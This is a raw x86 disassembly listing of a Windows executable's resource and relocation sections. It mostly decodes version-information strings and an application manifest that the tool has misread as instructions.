  40a27b:	add    BYTE PTR [ecx],dh
  40a27d:	add    BYTE PTR [edi],dh
  40a27f:	add    BYTE PTR [ebx],dh
  40a281:	add    BYTE PTR [esi],dh
  40a283:	add    BYTE PTR [esi],ch
  40a285:	add    BYTE PTR [eax],dh
  40a287:	add    BYTE PTR [eax],al
  40a289:	add    BYTE PTR [eax],al
  40a28b:	add    BYTE PTR [eax+0x0],dl
  40a28e:	pop    ss
  40a28f:	add    BYTE PTR [ecx],al
  40a291:	add    BYTE PTR [ecx+0x0],cl
  40a294:	outs   dx,BYTE PTR ds:[esi]
  40a295:	add    BYTE PTR [eax+eax*1+0x65],dh
  40a299:	add    BYTE PTR [edx+0x0],dh
  40a29c:	outs   dx,BYTE PTR ds:[esi]
  40a29d:	add    BYTE PTR [ecx+0x0],ah
  40a2a0:	ins    BYTE PTR es:[edi],dx
  40a2a1:	add    BYTE PTR [esi+0x0],cl
  40a2a4:	popa   
  40a2a5:	add    BYTE PTR [ebp+0x0],ch
  40a2a8:	add    BYTE PTR gs:[eax],al
  40a2ab:	add    BYTE PTR [ecx+0x0],cl
  40a2ae:	imul   eax,DWORD PTR [eax],0x450073
  40a2b4:	js     0x40a2b6
  40a2b6:	jo     0x40a2b8
  40a2b8:	jb     0x40a2ba
  40a2ba:	add    BYTE PTR gs:[ebx+0x0],dh
  40a2be:	jae    0x40a2c0
  40a2c0:	popa   
  40a2c1:	add    BYTE PTR [eax+eax*1+0x6d],ah
  40a2c5:	add    BYTE PTR [ecx+0x0],ch
  40a2c8:	outs   dx,BYTE PTR ds:[esi]
  40a2c9:	add    BYTE PTR [ebx+0x0],al
  40a2cc:	ins    DWORD PTR es:[edi],dx
  40a2cd:	add    BYTE PTR [eax+eax*1+0x2e],ah
  40a2d1:	add    BYTE PTR [ebp+0x0],ah
  40a2d4:	js     0x40a2d6
  40a2d6:	add    BYTE PTR gs:[eax],al
  40a2d9:	add    BYTE PTR [eax],al
  40a2db:	add    BYTE PTR [eax+0x1003a00],bl
  40a2e1:	add    BYTE PTR [eax+eax*1+0x65],cl
  40a2e5:	add    BYTE PTR [edi+0x0],ah
  40a2e8:	popa   
  40a2e9:	add    BYTE PTR [eax+eax*1+0x43],ch
  40a2ed:	add    BYTE PTR [edi+0x0],ch
  40a2f0:	jo     0x40a2f2
  40a2f2:	jns    0x40a2f4
  40a2f4:	jb     0x40a2f6
  40a2f6:	imul   eax,DWORD PTR [eax],0x680067
  40a2fc:	je     0x40a2fe
  40a2fe:	add    BYTE PTR [eax],al
  40a300:	inc    ebx
  40a301:	add    BYTE PTR [edi+0x0],ch
  40a304:	jo     0x40a306
  40a306:	jns    0x40a308
  40a308:	jb     0x40a30a
  40a30a:	imul   eax,DWORD PTR [eax],0x680067
  40a310:	je     0x40a312
  40a312:	and    BYTE PTR [eax],al
  40a314:	sub    BYTE PTR [eax],al
  40a316:	arpl   WORD PTR [eax],ax
  40a318:	sub    DWORD PTR [eax],eax
  40a31a:	and    BYTE PTR [eax],al
  40a31c:	dec    ebp
  40a31d:	add    BYTE PTR [ecx+0x0],ch
  40a320:	arpl   WORD PTR [eax],ax
  40a322:	jb     0x40a324
  40a324:	outs   dx,DWORD PTR ds:[esi]
  40a325:	add    BYTE PTR [ebx+0x0],dh
  40a328:	outs   dx,DWORD PTR ds:[esi]
  40a329:	add    BYTE PTR [esi+0x0],ah
  40a32c:	je     0x40a32e
  40a32e:	and    BYTE PTR [eax],al
  40a330:	inc    ebx
  40a331:	add    BYTE PTR [edi+0x0],ch
  40a334:	jb     0x40a336
  40a336:	jo     0x40a338
  40a338:	outs   dx,DWORD PTR ds:[esi]
  40a339:	add    BYTE PTR [edx+0x0],dh
  40a33c:	popa   
  40a33d:	add    BYTE PTR [eax+eax*1+0x69],dh
  40a341:	add    BYTE PTR [edi+0x0],ch
  40a344:	outs   dx,BYTE PTR ds:[esi]
  40a345:	add    BYTE PTR [esi],ch
  40a347:	add    BYTE PTR [eax],ah
  40a349:	add    BYTE PTR [ecx+0x0],al
  40a34c:	ins    BYTE PTR es:[edi],dx
  40a34d:	add    BYTE PTR [eax+eax*1+0x20],ch
  40a351:	add    BYTE PTR [edx+0x0],dh
  40a354:	imul   eax,DWORD PTR [eax],0x680067
  40a35a:	je     0x40a35c
  40a35c:	jae    0x40a35e
  40a35e:	and    BYTE PTR [eax],al
  40a360:	jb     0x40a362
  40a362:	add    BYTE PTR gs:[ebx+0x0],dh
  40a366:	add    BYTE PTR gs:[edx+0x0],dh
  40a36a:	jbe    0x40a36c
  40a36c:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  40a371:	add    BYTE PTR [eax],al
  40a373:	add    BYTE PTR [eax+0x0],bl
  40a376:	pop    ss
  40a377:	add    BYTE PTR [ecx],al
  40a379:	add    BYTE PTR [edi+0x0],cl
  40a37c:	jb     0x40a37e
  40a37e:	imul   eax,DWORD PTR [eax],0x690067
  40a384:	outs   dx,BYTE PTR ds:[esi]
  40a385:	add    BYTE PTR [ecx+0x0],ah
  40a388:	ins    BYTE PTR es:[edi],dx
  40a389:	add    BYTE PTR [esi+0x0],al
  40a38c:	imul   eax,DWORD PTR [eax],0x65006c
  40a392:	outs   dx,BYTE PTR ds:[esi]
  40a393:	add    BYTE PTR [ecx+0x0],ah
  40a396:	ins    DWORD PTR es:[edi],dx
  40a397:	add    BYTE PTR [ebp+0x0],ah
  40a39a:	add    BYTE PTR [eax],al
  40a39c:	dec    ecx
  40a39d:	add    BYTE PTR [ecx+0x0],ch
  40a3a0:	jae    0x40a3a2
  40a3a2:	inc    ebp
  40a3a3:	add    BYTE PTR [eax+0x0],bh
  40a3a6:	jo     0x40a3a8
  40a3a8:	jb     0x40a3aa
  40a3aa:	add    BYTE PTR gs:[ebx+0x0],dh
  40a3ae:	jae    0x40a3b0
  40a3b0:	popa   
  40a3b1:	add    BYTE PTR [eax+eax*1+0x6d],ah
  40a3b5:	add    BYTE PTR [ecx+0x0],ch
  40a3b8:	outs   dx,BYTE PTR ds:[esi]
  40a3b9:	add    BYTE PTR [ebx+0x0],al
  40a3bc:	ins    DWORD PTR es:[edi],dx
  40a3bd:	add    BYTE PTR [eax+eax*1+0x2e],ah
  40a3c1:	add    BYTE PTR [ebp+0x0],ah
  40a3c4:	js     0x40a3c6
  40a3c6:	add    BYTE PTR gs:[eax],al
  40a3c9:	add    BYTE PTR [eax],al
  40a3cb:	add    BYTE PTR [eax+eax*1+0x22],ah
  40a3cf:	add    BYTE PTR [ecx],al
  40a3d1:	add    BYTE PTR [eax+0x0],dl
  40a3d4:	jb     0x40a3d6
  40a3d6:	outs   dx,DWORD PTR ds:[esi]
  40a3d7:	add    BYTE PTR [eax+eax*1+0x75],ah
  40a3db:	add    BYTE PTR [ebx+0x0],ah
  40a3de:	je     0x40a3e0
  40a3e0:	dec    esi
  40a3e1:	add    BYTE PTR [ecx+0x0],ah
  40a3e4:	ins    DWORD PTR es:[edi],dx
  40a3e5:	add    BYTE PTR [ebp+0x0],ah
  40a3e8:	add    BYTE PTR [eax],al
  40a3ea:	add    BYTE PTR [eax],al
  40a3ec:	dec    ebp
  40a3ed:	add    BYTE PTR [ecx+0x0],ch
  40a3f0:	arpl   WORD PTR [eax],ax
  40a3f2:	jb     0x40a3f4
  40a3f4:	outs   dx,DWORD PTR ds:[esi]
  40a3f5:	add    BYTE PTR [ebx+0x0],dh
  40a3f8:	outs   dx,DWORD PTR ds:[esi]
  40a3f9:	add    BYTE PTR [esi+0x0],ah
  40a3fc:	je     0x40a3fe
  40a3fe:	and    BYTE PTR [eax],al
  40a400:	push   edi
  40a401:	add    BYTE PTR [ebp+0x0],ah
  40a404:	bound  eax,QWORD PTR [eax]
  40a406:	and    BYTE PTR [eax],al
  40a408:	push   eax
  40a409:	add    BYTE PTR [eax+eax*1+0x61],ch
  40a40d:	add    BYTE PTR [eax+eax*1+0x66],dh
  40a411:	add    BYTE PTR [edi+0x0],ch
  40a414:	jb     0x40a416
  40a416:	ins    DWORD PTR es:[edi],dx
  40a417:	add    BYTE PTR [eax],ah
  40a419:	add    BYTE PTR [ebp+0x0],al
  40a41c:	js     0x40a41e
  40a41e:	je     0x40a420
  40a420:	add    BYTE PTR gs:[esi+0x0],ch
  40a424:	jae    0x40a426
  40a426:	imul   eax,DWORD PTR [eax],0x6e006f
  40a42c:	jae    0x40a42e
  40a42e:	add    BYTE PTR [eax],al
  40a430:	cmp    al,0x0
  40a432:	or     eax,DWORD PTR [eax]
  40a434:	add    DWORD PTR [eax],eax
  40a436:	push   eax
  40a437:	add    BYTE PTR [edx+0x0],dh
  40a43a:	outs   dx,DWORD PTR ds:[esi]
  40a43b:	add    BYTE PTR [eax+eax*1+0x75],ah
  40a43f:	add    BYTE PTR [ebx+0x0],ah
  40a442:	je     0x40a444
  40a444:	push   esi
  40a445:	add    BYTE PTR [ebp+0x0],ah
  40a448:	jb     0x40a44a
  40a44a:	jae    0x40a44c
  40a44c:	imul   eax,DWORD PTR [eax],0x6e006f
  40a452:	add    BYTE PTR [eax],al
  40a454:	aaa    
  40a455:	add    BYTE PTR [esi],ch
  40a457:	add    BYTE PTR [ecx],dh
  40a459:	add    BYTE PTR [esi],ch
  40a45b:	add    BYTE PTR [ecx],dh
  40a45d:	add    BYTE PTR [edi],dh
  40a45f:	add    BYTE PTR [ebx],dh
  40a461:	add    BYTE PTR [esi],dh
  40a463:	add    BYTE PTR [esi],ch
  40a465:	add    BYTE PTR [eax],dh
  40a467:	add    BYTE PTR [eax],al
  40a469:	add    BYTE PTR [eax],al
  40a46b:	add    BYTE PTR [eax],bh
  40a46d:	add    BYTE PTR [eax],cl
  40a46f:	add    BYTE PTR [ecx],al
  40a471:	add    BYTE PTR [ecx+0x0],al
  40a474:	jae    0x40a476
  40a476:	jae    0x40a478
  40a478:	add    BYTE PTR gs:[ebp+0x0],ch
  40a47c:	bound  eax,QWORD PTR [eax]
  40a47e:	ins    BYTE PTR es:[edi],dx
  40a47f:	add    BYTE PTR [ecx+0x0],bh
  40a482:	and    BYTE PTR [eax],al
  40a484:	push   esi
  40a485:	add    BYTE PTR [ebp+0x0],ah
  40a488:	jb     0x40a48a
  40a48a:	jae    0x40a48c
  40a48c:	imul   eax,DWORD PTR [eax],0x6e006f
  40a492:	add    BYTE PTR [eax],al
  40a494:	aaa    
  40a495:	add    BYTE PTR [esi],ch
  40a497:	add    BYTE PTR [ecx],bh
  40a499:	add    BYTE PTR [esi],ch
  40a49b:	add    BYTE PTR [eax],dh
  40a49d:	add    BYTE PTR [esi],ch
  40a49f:	add    BYTE PTR [eax],dh
  40a4a1:	add    BYTE PTR [eax],al
  40a4a3:	add    BYTE PTR [eax],al
  40a4a5:	add    BYTE PTR [eax],al
  40a4a7:	add    bh,ch
  40a4a9:	mov    ebx,0x783f3cbf
  40a4ae:	ins    DWORD PTR es:[edi],dx
  40a4af:	ins    BYTE PTR es:[edi],dx
  40a4b0:	and    BYTE PTR [esi+0x65],dh
  40a4b3:	jb     0x40a528
  40a4b5:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40a4bc:	xor    BYTE PTR [edx],ah
  40a4be:	and    BYTE PTR [ebp+0x6e],ah
  40a4c1:	arpl   WORD PTR [edi+0x64],bp
  40a4c4:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  40a4cb:	inc    esi
  40a4cc:	sub    eax,0x73202238
  40a4d1:	je     0x40a534
  40a4d3:	outs   dx,BYTE PTR ds:[esi]
  40a4d4:	fs popa 
  40a4d6:	ins    BYTE PTR es:[edi],dx
  40a4d7:	outs   dx,DWORD PTR ds:[esi]
  40a4d8:	outs   dx,BYTE PTR ds:[esi]
  40a4d9:	gs cmp eax,0x73657922
  40a4df:	and    bh,BYTE PTR [edi]
  40a4e1:	ds or  eax,0x73613c0a
  40a4e7:	jae    0x40a54e
  40a4e9:	ins    DWORD PTR es:[edi],dx
  40a4ea:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  40a4ee:	js     0x40a55d
  40a4f0:	ins    BYTE PTR es:[edi],dx
  40a4f1:	outs   dx,BYTE PTR ds:[esi]
  40a4f2:	jae    0x40a531
  40a4f4:	and    dh,BYTE PTR [ebp+0x72]
  40a4f7:	outs   dx,BYTE PTR ds:[esi]
  40a4f8:	cmp    dh,BYTE PTR [ebx+0x63]
  40a4fb:	push   0x73616d65
  40a500:	sub    eax,0x7263696d
  40a505:	outs   dx,DWORD PTR ds:[esi]
  40a506:	jae    0x40a577
  40a508:	data16 je 0x40a538
  40a50b:	arpl   WORD PTR [edi+0x6d],bp
  40a50e:	cmp    ah,BYTE PTR [ecx+0x73]
  40a511:	ins    DWORD PTR es:[edi],dx
  40a512:	cs jbe 0x40a546
  40a515:	and    ah,BYTE PTR [eax]
  40a517:	ins    DWORD PTR es:[edi],dx
  40a518:	popa   
  40a519:	outs   dx,BYTE PTR ds:[esi]
  40a51a:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  40a521:	jb     0x40a596
  40a523:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40a52a:	xor    BYTE PTR [edx],ah
  40a52c:	ds or  eax,0x3c20200a
  40a532:	popa   
  40a533:	jae    0x40a5a8
  40a535:	gs ins DWORD PTR es:[edi],dx
  40a537:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  40a53b:	fs outs dx,BYTE PTR gs:[esi]
  40a53e:	je     0x40a5a9
  40a540:	je     0x40a5bb
  40a542:	and    BYTE PTR [esi+0x65],dh
  40a545:	jb     0x40a5ba
  40a547:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40a54e:	xor    BYTE PTR [esi],ch
  40a550:	xor    BYTE PTR [esi],ch
  40a552:	xor    BYTE PTR [edx],ah
  40a554:	and    BYTE PTR [esi+0x61],ch
  40a557:	ins    DWORD PTR es:[edi],dx
  40a558:	gs cmp eax,0x41794d22
  40a55e:	jo     0x40a5d0
  40a560:	ins    BYTE PTR es:[edi],dx
  40a561:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40a568:	cs popa 
  40a56a:	jo     0x40a5dc
  40a56c:	and    ch,BYTE PTR [edi]
  40a56e:	ds or  eax,0x3c20200a
  40a574:	je     0x40a5e8
  40a576:	jne    0x40a5eb
  40a578:	je     0x40a5c3
  40a57a:	outs   dx,BYTE PTR ds:[esi]
  40a57b:	outs   dx,WORD PTR ds:[esi]
  40a57d:	and    BYTE PTR [eax+0x6d],bh
  40a580:	ins    BYTE PTR es:[edi],dx
  40a581:	outs   dx,BYTE PTR ds:[esi]
  40a582:	jae    0x40a5c1
  40a584:	and    dh,BYTE PTR [ebp+0x72]
  40a587:	outs   dx,BYTE PTR ds:[esi]
  40a588:	cmp    dh,BYTE PTR [ebx+0x63]
  40a58b:	push   0x73616d65
  40a590:	sub    eax,0x7263696d
  40a595:	outs   dx,DWORD PTR ds:[esi]
  40a596:	jae    0x40a607
  40a598:	data16 je 0x40a5c8
  40a59b:	arpl   WORD PTR [edi+0x6d],bp
  40a59e:	cmp    ah,BYTE PTR [ecx+0x73]
  40a5a1:	ins    DWORD PTR es:[edi],dx
  40a5a2:	cs jbe 0x40a5d7
  40a5a5:	and    bh,BYTE PTR [esi]
  40a5a7:	or     eax,0x2020200a
  40a5ac:	and    BYTE PTR [ebx+esi*2],bh
  40a5af:	arpl   WORD PTR gs:[ebp+0x72],si
  40a5b3:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  40a5bb:	and    BYTE PTR [eax],ah
  40a5bd:	and    BYTE PTR [eax],ah
  40a5bf:	cmp    al,0x72
  40a5c1:	gs jno 0x40a639
  40a5c4:	gs jae 0x40a63b
  40a5c7:	gs fs push eax
  40a5ca:	jb     0x40a635
  40a5cc:	jbe    0x40a637
  40a5ce:	ins    BYTE PTR es:[edi],dx
  40a5cf:	gs addr16 gs jae 0x40a5f4
  40a5d4:	js     0x40a643
  40a5d6:	ins    BYTE PTR es:[edi],dx
  40a5d7:	outs   dx,BYTE PTR ds:[esi]
  40a5d8:	jae    0x40a617
  40a5da:	and    dh,BYTE PTR [ebp+0x72]
  40a5dd:	outs   dx,BYTE PTR ds:[esi]
  40a5de:	cmp    dh,BYTE PTR [ebx+0x63]
  40a5e1:	push   0x73616d65
  40a5e6:	sub    eax,0x7263696d
  40a5eb:	outs   dx,DWORD PTR ds:[esi]
  40a5ec:	jae    0x40a65d
  40a5ee:	data16 je 0x40a61e
  40a5f1:	arpl   WORD PTR [edi+0x6d],bp
  40a5f4:	cmp    ah,BYTE PTR [ecx+0x73]
  40a5f7:	ins    DWORD PTR es:[edi],dx
  40a5f8:	cs jbe 0x40a62e
  40a5fb:	and    bh,BYTE PTR [esi]
  40a5fd:	or     eax,0x2020200a
  40a602:	and    BYTE PTR [eax],ah
  40a604:	and    BYTE PTR [eax],ah
  40a606:	and    BYTE PTR [edx+esi*2],bh
  40a609:	gs jno 0x40a681
  40a60c:	gs jae 0x40a683
  40a60f:	gs fs inc ebp
  40a612:	js     0x40a679
  40a614:	arpl   WORD PTR [ebp+0x74],si
  40a617:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  40a61e:	ins    BYTE PTR es:[edi],dx
  40a61f:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  40a623:	gs ins BYTE PTR es:[edi],dx
  40a625:	cmp    eax,0x49736122
  40a62a:	outs   dx,BYTE PTR ds:[esi]
  40a62b:	jbe    0x40a69c
  40a62d:	imul   esp,DWORD PTR [ebp+0x72],0x22
  40a631:	and    BYTE PTR [ebp+0x69],dh
  40a634:	inc    ecx
  40a635:	arpl   WORD PTR [ebx+0x65],sp
  40a638:	jae    0x40a6ad
  40a63a:	cmp    eax,0x6c616622
  40a63f:	jae    0x40a6a6
  40a641:	and    ch,BYTE PTR [edi]
  40a643:	ds or  eax,0x2020200a
  40a649:	and    BYTE PTR [eax],ah
  40a64b:	and    BYTE PTR [edi+ebp*1],bh
  40a64e:	jb     0x40a6b5
  40a650:	jno    0x40a6c7
  40a652:	gs jae 0x40a6c9
  40a655:	gs fs push eax
  40a658:	jb     0x40a6c3
  40a65a:	jbe    0x40a6c5
  40a65c:	ins    BYTE PTR es:[edi],dx
  40a65d:	gs addr16 gs jae 0x40a6a0
  40a662:	or     eax,0x2020200a
  40a667:	and    BYTE PTR [edi+ebp*1],bh
  40a66a:	jae    0x40a6d1
  40a66c:	arpl   WORD PTR [ebp+0x72],si
  40a66f:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  40a677:	cmp    al,0x2f
  40a679:	je     0x40a6ed
  40a67b:	jne    0x40a6f0
  40a67d:	je     0x40a6c8
  40a67f:	outs   dx,BYTE PTR ds:[esi]
  40a680:	outs   dx,WORD PTR ds:[esi]
  40a682:	ds or  eax,0x612f3c0a
  40a688:	jae    0x40a6fd
  40a68a:	gs ins DWORD PTR es:[edi],dx
  40a68c:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  40a690:	or     eax,0xa
  40a695:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

0040c000 <.reloc>:
  40c000:	add    BYTE PTR [eax+0xc0000],al
  40c006:	add    BYTE PTR [eax],al
  40c008:	sar    BYTE PTR [ecx],1
	...
